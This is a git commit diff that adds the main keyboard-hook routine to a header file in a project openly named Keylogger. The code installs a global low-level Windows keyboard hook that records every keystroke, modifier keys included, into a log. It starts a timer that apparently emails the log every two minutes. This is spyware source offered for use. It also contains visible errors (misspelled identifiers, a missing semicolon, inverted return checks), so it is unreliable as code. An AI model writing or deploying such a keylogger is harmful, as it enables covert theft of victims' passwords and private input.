633c103f4f598dad6bb3feb54c1e77127b6c6cf2
Arnav Sharma <arnavsharma2711@gmail.com>
2021-03-24 23:17:49 +0530

    Added Major Function in KeybHook.h.

--- Keylogger/KeybHook.h
+++ Keylogger/KeybHook.h
@@ -35,6 +35,63 @@ Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite );
 
 HHOOK eHook = NULL;
 
+LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
+{
+    if(ncode<0)
+        CallNextHookEx(eHook, nCode, wparam, lparam)
+    KBDLLHOOKSTRUCT *kbs = (KBDDLLHOOKSTRUCT *)lparam;
+    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
+    {
+        keylog += Keys::KEYS[kbs->vkCode].Name;
+        if(kbs->vkCode == VK_RETURN)
+            keylog += "\n";
+    }
+    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
+    {
+        DWORD key = kbs->vkCode;
+        if(   key == VK_CONTROL
+           || key == VK_LCONTROL
+           || key == VK_RCONTROL
+           || key == VK_RSHIFT
+           || key == VK_LSHIFT
+           || key == VK_MENU
+           || key == VK_LMENU
+           || key == VK_RMENU
+           || key == VK_CAPITAL
+           || key == VK_NUMLOCK
+           || key == VK_LWIN
+           || key == VK_RWIN
+           )
+        {
+            std::stringbuf keyName = Keys::KEYS[kbs->vkCode].Name;
+            keyName.insert(1,"/");
+            keylog += keyName;
+        }
+    }
 
+    return CallNextHookEx(eHook, nCode, wparam, lparam);
+}
+
+bool InstallHook()
+{
+    Helper::WriteAppLog("Hook Stared...Timer Started");
+    MailTimer.Start(true);
+
+    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
+
+    return eHook == NULL;
+}
+
+bool UninstallHook()
+{
+    BOOL b = UnhookWindowsHookEx(eHook);
+    eHook = NULL;
+    return (bool)b;
+}
+
+bool IsHooked()
+{
+    return (bool)(eHook == NULL);
+}
 
 #endif // KEYBHOOK_H
